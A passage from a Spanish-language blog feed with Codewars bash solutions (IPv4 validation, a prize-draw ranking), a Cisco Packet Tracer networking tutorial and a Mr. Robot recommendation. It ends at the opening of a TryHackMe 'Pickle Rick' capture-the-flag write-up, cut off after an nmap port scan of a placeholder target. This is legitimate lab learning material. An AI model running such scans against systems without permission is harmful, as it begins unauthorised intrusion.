<h3 id="otras-soluciones">Otras soluciones</h3>

<h4 id="la-más-corta">La más corta</h4>
<p>Esta <a href="https://www.codewars.com/kata/reviews/58a66e2904d7e1afce000013/groups/58a66e314e1eac9af7000008">solución</a> fue hecha por el usuario <a href="https://www.codewars.com/users/zimo">zimo</a>, tiene un enfoque más directo, y aunque parece complicada de entender, si la separas por partes es fácil comprender.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> | egrep <span class="nt">-q</span> <span class="s2">"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])</span><span class="se">\.</span><span class="s2">){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"True"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"False"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Básicamente lo que hace esta solución es:</p>
<ol>
  <li>Pasar la cadena de la IP (<code class="language-plaintext highlighter-rouge">$1</code>) a egrep (también es posible <code class="language-plaintext highlighter-rouge">grep -E</code>) para que busque el patrón entre comillas de manera silenciosa (<code class="language-plaintext highlighter-rouge">-q</code>).</li>
  <li>Se busca el patrón <code class="language-plaintext highlighter-rouge">([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.)</code> al inicio de la cadena, lo que hace coincidir a las siguientes cadenas:
    <ul>
      <li>de un digito con rango del 0 al 9 ó (<code class="language-plaintext highlighter-rouge">[0-9]|</code>)</li>
      <li>de dos digitos con rango de 10 al 99 ó (<code class="language-plaintext highlighter-rouge">[1-9][0-9]|</code>)</li>
      <li>de tres digitos del 100 al 199 ó (<code class="language-plaintext highlighter-rouge">1[0-9]{2}|</code>)</li>
      <li>de tres digitos del 200 al 249 ó (<code class="language-plaintext highlighter-rouge">2[0-4][0-9]|</code>)</li>
      <li>de tres digitos del 250 al 255 (<code class="language-plaintext highlighter-rouge">25[0-5]</code>)</li>
    </ul>
  </li>
  <li>Cualquiera de las anteriores cadenas termina con un punto (<code class="language-plaintext highlighter-rouge">\.</code>), eso valida el octeto</li>
  <li>La cadena tiene que tener 3 octetos con esas mismas reglas (<code class="language-plaintext highlighter-rouge">{3}</code>)</li>
  <li>El último octeto comprueba lo mismo que en el punto 2. A diferencia de los otros octetos, éste no termina con un punto.</li>
  <li>Finalmente, si eso se cumple, se regresa un <code class="language-plaintext highlighter-rouge">True</code>, si no se regresa <code class="language-plaintext highlighter-rouge">False</code>.</li>
</ol>

<hr />
<h3 id="nuevo-intento">Nuevo intento</h3>
<p>Viendo las soluciones de la comunidad, noté que el patrón <code class="language-plaintext highlighter-rouge">([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.)</code> se utiliza mucho, y creo que es la mejor forma de hacerlo. Así que <strong>modifiqué la solución de zimo</strong>, combinando sintaxis de mi anterior solución, sin utilizar <code class="language-plaintext highlighter-rouge">grep</code> para hacer una <em>oneliner</em> que quedó de esta forma:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">o</span><span class="o">=</span><span class="s2">"([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])"</span> <span class="o">&amp;&amp;</span> <span class="o">[[</span> <span class="nv">$1</span> <span class="o">=</span>~ ^<span class="o">((</span><span class="nv">$o</span><span class="se">\.</span><span class="o">){</span>3<span class="o">}</span><span class="nv">$o</span><span class="o">)</span><span class="nv">$ </span><span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"True"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"False"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Que incluso fue un poco más corta que la propuesta original.</p>

<hr />
<h2 id="lo-que-aprendí">Lo que aprendí</h2>

<h3 id="en-mi-código">En mi código</h3>
<ul>
  <li>Recordar un poco sobre regex.</li>
  <li>Aplicar la sintaxis de soluciones externas vistas en el <a href="https://m3f1s7o.github.io/prize-draw/#otras-soluciones">anterior Kata</a></li>
</ul>

<h3 id="en-el-código-de-zimo">En el código de zimo</h3>
<ul>
  <li>Con un poco de ingenio se pueden crear patrones para <em>capturar</em> lo que se busca.</li>
</ul>]]></content><author><name>Jimmy Mendoza</name></author><category term="programacion" /><category term="bash" /><category term="codewars" /><category term="6kyu" /><category term="kata" /><summary type="html"><![CDATA[Reto de programación en bash para validar el formato correcto de una dirección IPv4.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Prize Draw</title><link href="http://localhost:4000/prize-draw/" rel="alternate" type="text/html" title="Prize Draw" /><published>2023-06-17T00:00:00+00:00</published><updated>2023-06-20T23:03:05+00:00</updated><id>http://localhost:4000/prize-draw</id><content type="html" xml:base="http://localhost:4000/prize-draw/"><![CDATA[<h1 id="prize-draw">Prize Draw</h1>

<p><a href="https://www.codewars.com/kata/5616868c81a0f281e500005c">Enlace al kata</a>: 5/5 🖤</p>

<blockquote>
  <p>En este problema se nos pide encontrar el nombre ganador de un sorteo, como datos de entrada tenemos una lista de nombres, una lista de <em>pesos</em> y una posición que será el nombre seleccionado. Para cada nombre tendremos que sumar el valor de todas sus letras, sumar la longitud del nombre y por último multiplicar por el peso que le corresponde de la lista, el resultado es un número ganador para cada nombre. Con todos los números ganadores obtenidos tendremos que ordenarlos de mayor a menor (si hay dos números ganadores iguales se ordenará además alfabéticamente). Por último, devolveremos al nombre en la posición solicitada.</p>
</blockquote>

<h2 id="instrucciones">Instrucciones</h2>

<p><em>Instrucciones traducidas</em></p>

<p>Para participar en un sorteo cada quien da su nombre.</p>

<p>Cada letra del nombre tiene un valor el cual es su posición en el alfabeto inglés. <code class="language-plaintext highlighter-rouge">A</code> y <code class="language-plaintext highlighter-rouge">a</code> tienen una posición <code class="language-plaintext highlighter-rouge">1</code>, <code class="language-plaintext highlighter-rouge">B</code> y <code class="language-plaintext highlighter-rouge">b</code> posición <code class="language-plaintext highlighter-rouge">2</code> y así.</p>

<p>La <em>longitud</em> del nombre se suma a la <em>suma</em> de esas posiciones, de ahí un número <code class="language-plaintext highlighter-rouge">som</code>.</p>

<p>Un array de pesos aleatorios está ligado a los nombres y cada <code class="language-plaintext highlighter-rouge">som</code> es multiplicado por su correspondiente peso para obtener lo que llaman un <code class="language-plaintext highlighter-rouge">número ganador</code>.</p>

<h3 id="ejemplo">Ejemplo</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>names: "COLIN,AMANDBA,AMANDAB,CAROL,PauL,JOSEPH"
weights: [1, 4, 4, 5, 2, 1]

PauL -&gt; som = longitud del nombre + 16 + 1 + 21 + 12 = 4 + 50 -&gt; 54
El *peso* asociado con PauL es 2 así que el *número ganador* de PauL es  54 * 2 = 108.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ahora se pueden ordenar los nombres en el orden <em>decreciente</em> de los <code class="language-plaintext highlighter-rouge">números ganadores</code>. Cuando dos personas tienen el mismo <code class="language-plaintext highlighter-rouge">número ganador</code> ordénalos <em>alfabéticamente</em> por sus nombres.</p>

<h3 id="tareas">Tareas</h3>

<ul>
  <li>parametros: <code class="language-plaintext highlighter-rouge">st</code> una cadena de nombres, <code class="language-plaintext highlighter-rouge">we</code> un array de pesos, <code class="language-plaintext highlighter-rouge">n</code> una posición</li>
  <li>regresar: el nombre del participante con la posición <code class="language-plaintext highlighter-rouge">n</code> (posiciones son numeradas a partir de 1)</li>
</ul>

<h3 id="ejemplo-1">Ejemplo</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>names: "COLIN,AMANDBA,AMANDAB,CAROL,PauL,JOSEPH"
weights: [1, 4, 4, 5, 2, 1]
n: 4

La función debe regresar: "PauL"
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="notas">Notas</h3>

<ul>
  <li>El array de pesos es por lo menos tan largo como la cantidad de nombres, puede ser más largo.</li>
  <li>Si <code class="language-plaintext highlighter-rouge">st</code> está vacía, regresa “No participants”.</li>
  <li>Si <code class="language-plaintext highlighter-rouge">n</code> es más grande que el número de participantes, entonces regresa “Not enough participants”.</li>
</ul>

<hr />
<h2 id="mi-solución">Mi solución</h2>
<p>Esta solución la fui desarrollando en la marcha, pues realmente sólo sabía lo básico sobre variables, condicionales, funciones y ciclos, pero sin recordar al cien por ciento la sintáxis. Consulté bastantes páginas para saber cómo se hacía lo que tenía en mente, lo que me daba errror y sobre como refactorizar mi código.</p>

<h3 id="algoritmo">Algoritmo</h3>

<p><img src="/assets/images/posts/prize_draw_algorithm.png" alt="algoritmo" /></p>

<h3 id="código">Código</h3>

<p><em>Código con comentarios en español</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># valida los datos de entrada</span>
validate <span class="o">()</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="nt">-z</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"No participants"</span>
    
  <span class="k">elif</span> <span class="o">[[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$1</span> | <span class="nb">tr</span> <span class="s2">","</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">wc</span> <span class="nt">-l</span><span class="si">)</span> <span class="nt">-lt</span> <span class="nv">$3</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"Not enough participants"</span>
  
  <span class="k">else
    </span>rank <span class="nv">$1</span> <span class="nv">$2</span> <span class="nv">$3</span>
    
  <span class="k">fi</span>
   
<span class="o">}</span>

<span class="c"># procesa y ordena los nombres</span>
rank <span class="o">()</span> <span class="o">{</span>
  <span class="c"># pasa a minúsculas los nombres</span>
  <span class="nv">list</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="p">,,</span><span class="k">}</span><span class="s2">"</span>

  <span class="c"># separa nombres y pesos</span>
  <span class="nv">IFS</span><span class="o">=</span><span class="s2">","</span> <span class="nb">read</span> <span class="nt">-ra</span> names <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$list</span><span class="s2">"</span> 
  <span class="nv">IFS</span><span class="o">=</span><span class="s2">","</span> <span class="nb">read</span> <span class="nt">-ra</span> wghts <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span> 

  <span class="c"># obtiene cada nombre</span>
  <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 <span class="k">$((</span> <span class="k">${#</span><span class="nv">names</span><span class="p">[@]</span><span class="k">}</span> <span class="o">-</span><span class="m">1</span> <span class="k">))</span><span class="si">)</span><span class="p">;</span> <span class="k">do
    </span><span class="nv">name</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">names</span><span class="p">[i]</span><span class="k">}</span><span class="s2">"</span>
    <span class="nv">total</span><span class="o">=</span>0

	<span class="c"># obtiene cada letra y su valor</span>
    <span class="k">for </span>j <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 <span class="k">$((</span> <span class="k">${#</span><span class="nv">name</span><span class="k">}</span> <span class="o">-</span><span class="m">1</span> <span class="k">))</span><span class="si">)</span><span class="p">;</span> <span class="k">do</span>
      <span class="c">#total=$((total + $(echo $abc | cut -d "${name:j:1}" -f 1 | wc -c)))  # calcula el total en una línea, pero se mantuvo dando Execution Timed Out</span>
      
      <span class="nb">local </span><span class="nv">value</span><span class="o">=</span><span class="si">$(</span>charValue <span class="k">${</span><span class="nv">name</span>:j:1<span class="k">}</span><span class="si">)</span>
      <span class="nv">total</span><span class="o">=</span><span class="k">$((</span>total <span class="o">+</span> value<span class="k">))</span>
      
    <span class="k">done</span>

	<span class="c"># calcula los números ganadores ((total + len) * weight)</span>
    <span class="nv">w_num</span><span class="o">=</span><span class="k">$((</span> <span class="k">$((</span>total <span class="o">+</span> <span class="k">${#</span><span class="nv">name</span><span class="k">}))</span> <span class="o">*</span> <span class="k">${</span><span class="nv">wghts</span><span class="p">[i]</span><span class="k">}</span> <span class="k">))</span>

	<span class="c"># cadena de nombres y números ganadores</span>
    nms_wnum+<span class="o">=</span><span class="s2">"</span><span class="nv">$name</span><span class="s2"> </span><span class="nv">$w_num</span><span class="s2">,"</span>
    
  <span class="k">done</span>          

  <span class="c"># ordena primero por el número ganador y luego por nombre</span>
  <span class="nv">sorted</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$nms_wnum</span> | <span class="nb">tr</span> <span class="s2">","</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">sort</span> <span class="nt">-k</span> 2,2nr <span class="nt">-k</span> 1,1 | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">":"</span><span class="si">)</span>

  <span class="c"># obtiene el nombre de la posición deseada</span>
  <span class="nv">name</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$sorted</span> | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">nl</span> <span class="nt">-s</span><span class="s2">" "</span> <span class="nt">-w1</span> | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f</span> 1 | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 2<span class="si">)</span>
  <span class="c"># devuelve el nombre con la primer letra en mayúscula</span>
  <span class="nb">echo</span> <span class="k">${</span><span class="nv">name</span><span class="p">^</span><span class="k">}</span>
    
<span class="o">}</span>

<span class="c"># obtiene los valores indivuduales de las letras</span>
charValue <span class="o">()</span> <span class="o">{</span>
  <span class="nv">abc</span><span class="o">=</span><span class="s2">"abcdefghijklmnopqrstuvwxyz"</span>

  <span class="c"># corta la cadena abc con el argumento dado</span>
  <span class="nv">IFS</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="nb">read</span> <span class="nt">-ra</span> tmp <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$abc</span><span class="s2">"</span>

  <span class="c"># obtiene la longitud de la variable tmp</span>
  <span class="nb">local </span><span class="nv">value</span><span class="o">=</span><span class="k">$((</span> <span class="k">${#</span><span class="nv">tmp</span><span class="k">}</span> <span class="o">+</span><span class="m">1</span> <span class="k">))</span>
  <span class="nb">echo</span> <span class="nv">$value</span>
  
<span class="o">}</span>

validate <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Cuando finalicé me sentí como si hubiera escrito el código para echar a andar un transbordador espacial, y aunque sabía que seguramente había soluciones mucho mejores, me gustó el Kata porque fue mi primer reto real en bash.</p>

<hr />
<h2 id="otras-soluciones">Otras soluciones</h2>

<p><a href="https://www.codewars.com/kata/reviews/59e1e45d456cd3977c0002e5/groups/62f9ed22885ae200011b7fec">Solución</a> propuesta por el usuario <a href="https://www.codewars.com/users/DEV0001">DEV0001</a>. <strong>Código comentado por mí</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

rank <span class="o">()</span> <span class="o">{</span>
  <span class="c"># separa los nombres y los pesos</span>
  <span class="nv">IFS</span><span class="o">=</span><span class="s2">","</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-a</span> names <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
  <span class="nv">IFS</span><span class="o">=</span><span class="s2">","</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-a</span> weights <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
  <span class="nv">rank</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>

  <span class="c"># hace las validaciones</span>
  <span class="o">[[</span> <span class="k">${#</span><span class="nv">names</span><span class="p">[@]</span><span class="k">}</span> <span class="nt">-eq</span> 0 <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"No participants"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>
  <span class="o">[[</span> <span class="k">${</span><span class="nv">rank</span><span class="k">}</span> <span class="nt">-gt</span> <span class="k">${#</span><span class="nv">names</span><span class="p">[@]</span><span class="k">}</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Not enough participants"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>

  <span class="c"># recorre todos los nombres</span>
  <span class="k">for </span>i <span class="k">in</span> <span class="k">${</span><span class="p">!names[@]</span><span class="k">}</span><span class="p">;</span> <span class="k">do</span>
	<span class="c"># obtiene la longitud del nombre</span>
    <span class="nb">let </span><span class="nv">res</span><span class="o">=</span><span class="k">${#</span><span class="nv">names</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="k">}</span>
	<span class="c"># recorre los carácteres del nombre</span>
    <span class="k">for </span>chr <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">names</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">tr</span> <span class="o">[</span>A-Z] <span class="o">[</span>a-z] | <span class="nb">grep</span> <span class="nb">.</span> <span class="nt">-o</span><span class="si">)</span><span class="p">;</span> <span class="k">do</span>
	  <span class="c"># encuentra el valor del carácter</span>
      <span class="nb">let </span>res+<span class="o">=</span><span class="si">$(</span><span class="nb">eval echo</span> <span class="o">{</span>a..<span class="k">${</span><span class="nv">chr</span><span class="k">}</span><span class="o">}</span> | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">wc</span> <span class="nt">-l</span><span class="si">)</span>
    <span class="k">done</span>
	<span class="c"># obtiene el número ganador</span>
    <span class="nb">let </span>res<span class="k">*</span><span class="o">=</span><span class="k">${</span><span class="nv">weights</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="k">}</span>
    <span class="c"># da la cadena con el número ganador y el nombre</span>
    <span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">res</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">names</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">done</span> <span class="se">\ </span> 
  <span class="c"># termina el ciclo y manda la salida al comando sort, ordena por la primer y segunda columna y manda la salida a awk</span>
  <span class="c"># awk obtiene la posición deseada e imprime el nombre</span>
  | <span class="nb">sort</span> <span class="nt">-k</span> 1nr,2 | <span class="nb">awk</span> <span class="nt">-v</span> <span class="s2">"n=</span><span class="k">${</span><span class="nv">rank</span><span class="k">}</span><span class="s2">"</span> <span class="s1">'(NR==n){print $2}'</span>
<span class="o">}</span>
rank <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Esta solución es la más corta y fácil de entender que encontré. Da solución al problema de una forma <strong>elegante</strong> y <strong>ordenada</strong>.</p>

<hr />
<h2 id="lo-que-aprendí">Lo que aprendí</h2>

<h3 id="en-mi-código">En mi código</h3>
<ul>
  <li><a href="https://www.howtogeek.com/730243/what-are-bash-dictionaries-on-linux-and-how-do-you-use-them/">Diccionarios en bash</a></li>
  <li><a href="http://stackoverflow.com/questions/918886/ddg#918931">Separar cadenas</a></li>
  <li><a href="https://linuxopsys.com/topics/sort-in-linux-by-multiple-columns">Ordenar múltiples columnas</a> (originalmente me ayudé de ChatGPT)</li>
  <li>Mucha sintáxis</li>
</ul>

<h3 id="en-el-código-de-dev0001">En el código de DEV0001</h3>
<ul>
  <li>Se pueden utilizar sólo <a href="https://www.baeldung.com/linux/bash-single-vs-double-brackets">corchetes dobles</a> para validaciones o tests</li>
  <li>awk es bastante útil para procesar cadenas</li>
  <li>Algunas otras soluciones ingeniosas</li>
</ul>]]></content><author><name>Jimmy Mendoza</name></author><category term="programacion" /><category term="bash" /><category term="codewars" /><category term="6kyu" /><summary type="html"><![CDATA[Reto de programación en bash para operar con cadenas y ordenarlas.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">La red más simple</title><link href="http://localhost:4000/la-red-mas-simple/" rel="alternate" type="text/html" title="La red más simple" /><published>2023-05-07T00:00:00+00:00</published><updated>2023-05-07T00:00:00+00:00</updated><id>http://localhost:4000/la-red-mas-simple</id><content type="html" xml:base="http://localhost:4000/la-red-mas-simple/"><![CDATA[<h1 id="la-red-más-simple">La red más simple</h1>

<h2 id="red">Red</h2>
<blockquote>
  <p>Una red es un conjunto de computadoras que están conectadas en un medio común y comparten información entre sí.</p>
</blockquote>

<p>La red más grande que existe es internet, es una red a la que se conectan millones de dispositivos y que te permite ver esta página web. Pero dejando de lado internet, también utilizas otras redes más pequeñas en tu día a día, por ejemplo, cuando conectas tu smarthpone a una bocina o audifonos bluetooth, estás conectándote a la red de ese dispositivo y por lo tanto puedes intercabiar información con él.</p>

<p>Existen distintos tipos y topologías de redes, pero en este post vamos a ver la red más simple utilizando el simulador Cisco Packet Tracer.</p>

<h2 id="construcción">Construcción</h2>

<h3 id="agregar-los-equipos">Agregar los equipos</h3>
<p>Para esta red vamos a agregar 2 <code class="language-plaintext highlighter-rouge">PCs</code> o <code class="language-plaintext highlighter-rouge">laptops</code> al espacio lógico.</p>

<p><img src="/assets/images/posts/red01.png" alt="Agregar equipos" /></p>

<h3 id="conexión">Conexión</h3>
<p>Ahora conectaremos estos dos equipos utilizando el <code class="language-plaintext highlighter-rouge">Cable de cable cruzado</code> desde el puerto <code class="language-plaintext highlighter-rouge">FastEthernet0</code> al mismo del otro equipo.</p>

<p><img src="/assets/images/posts/red02.png" alt="Conectar equipos" /></p>

<p>Ya tenemos una red, sin embargo si probamos hacer envíar una <code class="language-plaintext highlighter-rouge">PDU simple</code> de un equipo al otro, vamos diciendo que <em>no hay puertos funcionales para el dispositivo</em>. Esto pasa porque necesitamos agregar una dirección <code class="language-plaintext highlighter-rouge">IP</code> a cada equipo, de esa manera los dispositivos <em>tendran una identificación</em> y el otro podrá comunicarse con él.</p>

<h3 id="agregar-dirección-ip">Agregar dirección IP</h3>
<p>Para agregar una dirección IP vamos a ingresar a la <code class="language-plaintext highlighter-rouge">configuración de IP</code> como se muestra en la imagen:</p>

<p><img src="/assets/images/posts/red03.png" alt="Agregar IPs" /></p>

<p>En la ventana que se nos abre vamos a llenar los siguientes campos:</p>
<ul>
  <li>IPv4 Address: <code class="language-plaintext highlighter-rouge">192.168.0.1</code></li>
  <li>Subnet Mask: <code class="language-plaintext highlighter-rouge">255.255.255.0</code></li>
</ul>

<p><img src="/assets/images/posts/red04.png" alt="Agregar IPs" /></p>

<p>Y cerramos la ventana. Ahora podemos <strong>posar</strong> el cursor sobre la PC y veremos que ya tiene una dirección IP asignada.</p>

<p><img src="/assets/images/posts/red05.png" alt="Verifica IPs" /></p>

<p>Ahora vamos a repetir el proceso con la laptop utilizando ahora la dirección IP <code class="language-plaintext highlighter-rouge">192.168.0.2</code> con la misma máscara de subred.</p>

<p><img src="/assets/images/posts/red06.png" alt="Segunda IP" /></p>

<p>Por último pondré en notas (presionando la tecla <code class="language-plaintext highlighter-rouge">N</code>) la dirección de los equipos.</p>

<p><img src="/assets/images/posts/red07.png" alt="Etiquetas" /></p>]]></content><author><name>Jimmy Mendoza</name></author><category term="redes" /><category term="packettracer" /><summary type="html"><![CDATA[Red de dos computadoras simulada en Cisco Packet Tracer.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Mr. Robot</title><link href="http://localhost:4000/mr-robot/" rel="alternate" type="text/html" title="Mr. Robot" /><published>2023-05-05T00:00:00+00:00</published><updated>2023-05-05T00:00:00+00:00</updated><id>http://localhost:4000/mr-robot</id><content type="html" xml:base="http://localhost:4000/mr-robot/"><![CDATA[<h1 id="mr-robot">Mr. Robot</h1>
<blockquote>
  <p>Mr. Robot es drama centrado en Elliot, un hacker que trabaja en una monótona empresa de ciberseguridad. Sin embargo, todo cambia cuando es reclutado por un grupo de hackers que tienen como meta un objetivo simple: cambiar el sistema que gobierna al mundo.</p>
</blockquote>

<p><img src="/assets/images/posts/mr_robot.png" alt="mr. robot" /></p>

<h2 id="por-qué-te-hablo-de-mr-robot">¿Por qué te hablo de Mr. Robot?</h2>
<p>La serie está <strong>inspirada en técnicas reales de hacking</strong>, no todo lo mostrado es cien por ciento apegado a la realidad, pero es una de las mejores representaciones de hacking en series y películas que conozco.
Por lo que, si estás empezando en el mundo de la ciberseguridad es una buena forma de tener un acercamiento al mundillo del hacking.</p>

<p>Y aún si ya tienes experiencia en el área, si buscas una serie que te mantenga pegado al asiento y que te haga querer cambiar el sistema, Mr. Robot es lo mejor que te puedo recomendar. Además, ¿por qué no ver una de las series que tiene algunos de los <strong><a href="https://www.imdb.com/title/tt8084176/">capítulos mejores puntuados en IMDB</a></strong>?.</p>

<h2 id="cómo-ver-la-serie">¿Cómo ver la serie?</h2>
<p>Dos pasos:</p>
<ol>
  <li>Ve un capítulo</li>
  <li>Consulta el post del capítulo <a href="../categories/mr-robot/">aquí</a></li>
</ol>

<p>Tan simple como eso. Y es que como te comenté arriba, muchas de las escenas en el show tienen bases reales, por lo que <strong>probablemente escucharás términos de redes, hacking y sistemas de las que jamás hayas escuchado antes</strong> (no te preocupes, a mí también me pasó la primera vez que lo vi). Por eso he estado haciendo resúmenes y explicaciones de cada uno de los episodios de la serie, donde repaso las escenas importantes para que no te sientas perdido. Además es una buena forma de seguir aprendiendo.</p>

<p>En cada post doy un resumen no tan exhaustivo, pero dejo enlaces en cada tema a vídeos, artículos u otros posts para que si te interesa, profundices más en el tema.</p>]]></content><author><name>Jimmy Mendoza</name></author><category term="mr_robot" /><category term="series" /><category term="noob" /><summary type="html"><![CDATA[Mr. Robot, la mejor serie para empezar a aprender sobre hacking]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pickle Rick</title><link href="http://localhost:4000/pickle-rick/" rel="alternate" type="text/html" title="Pickle Rick" /><published>2023-04-16T00:00:00+00:00</published><updated>2023-04-16T00:00:00+00:00</updated><id>http://localhost:4000/pickle-rick</id><content type="html" xml:base="http://localhost:4000/pickle-rick/"><![CDATA[<h1 id="pickle-rick">Pickle Rick</h1>
<p>Enlace: https://tryhackme.com/room/picklerick</p>

<p>Instrucciones:
Este reto con tema de Rick y Morty requiere que explotes un <strong>servidor web</strong> para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en humano de su forma de pepinillo.</p>

<p>Una vez que nos hayamos conectado a través de VPN a la máquina empezaremos con la fase de reconocimiento.</p>

<hr />
<h2 id="reconocimiento">Reconocimiento</h2>

<h3 id="nmap">nmap</h3>
<p>Lo primero que haremos es ejecutar nmap para descubrir los puertos del sistema objetivo:</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;ip&gt; 
